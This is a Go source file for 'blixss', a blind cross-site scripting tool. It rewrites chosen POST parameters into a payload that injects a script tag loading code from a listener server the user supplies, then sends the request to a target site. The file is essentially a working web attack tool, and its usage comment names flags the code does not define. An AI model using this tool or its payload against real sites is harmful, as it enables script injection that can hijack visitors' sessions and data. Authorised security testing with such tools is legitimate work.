package main

import (
	"bytes"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"strings"	
)

// Usage blixss -t <<target url>> -b <<post body>> -l <<listener server>> -d <<custom/request/directory>>
// e.g "blixss -target "http://example.com" -body "parameter1=XSS&parameter2=test2&parameter3=XSS" -listener "http://10.10.15.122:45000" -not "parameter2,parameter3"
// Parameter values different from 'XSS' will not be tested
import (
	"os"
)
func main() {

	var (
		targetUrl      string
		postBody       string
		listenerServer string
		custom	string
	)

	flag.StringVar(&targetUrl, "t", "", "Target URL")
	flag.StringVar(&postBody, "b", "", "Body strings with the parameters of the request.")
	flag.StringVar(&listenerServer, "l", "", "URL to forward the requests to ")
	flag.StringVar(&custom, "d", "", "Specifies custom directory to make the GET request. If not specified, it will attach /<<paramName>> on the request.")
	flag.Parse()

	// Check if target is valid URL
	if targetUrl == "" {
		fmt.Println("You must specify a valid target URL. Use -target \"http://address\"")
		os.Exit(1)
	}

	//Check if body value is correctly formated
	if postBody == "" {
		fmt.Println("Body parameters are empty. Use -body \"parameter=value1&optional=value2\" .")
		os.Exit(1)
	}
	bodyValues, err := url.ParseQuery(postBody)
	if err != nil {
		fmt.Println("Invalid body parameters format. Use -body \"parameter=value1&optional=value2\" .")
		os.Exit(1)
	}

	//Check is listener is valid
	if listenerServer == "" {
		fmt.Println("You must specify a server to forward the requests. Please use -listener \"http://address\"")
		os.Exit(1)
	}
	if strings.HasSuffix(listenerServer, "/") {
		listenerServer = listenerServer[:len(listenerServer)-1]
	}


	//Removing '/' from custom if existing.
	if strings.HasPrefix(custom, "/") {
		custom = custom[1:len(custom)]
	}
	
	//Re-encoding body data and crafting malicious request
	payload := getPayload(bodyValues, listenerServer, custom).Encode()
	client := &http.Client{}
	req, err := http.NewRequest("POST", targetUrl, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Invalid request.")
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	//Sending request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("An error has occurred. Couldn't make request")
	}
	stringResponse := "Request sent. Response code: " + strconv.Itoa(resp.StatusCode)
	fmt.Println(stringResponse)

}

func getPayload(body url.Values, listener string, custom string) url.Values {
	payload := url.Values{}
	for paramName, paramValue := range body {
		if paramValue[0] != "XSS" {
			//If user does not want to test this parameter, we set it to the input value.
			payload.Add(paramName, paramValue[0])
		} else {
			newValue := "\"><script src=\"" + listener + "/"
			if custom == "" {
				newValue += paramName 
			} else {
				newValue += custom
			}
			newValue += "\"></script>"
			payload.Add(paramName, newValue)
		}
	}

	return payload
}
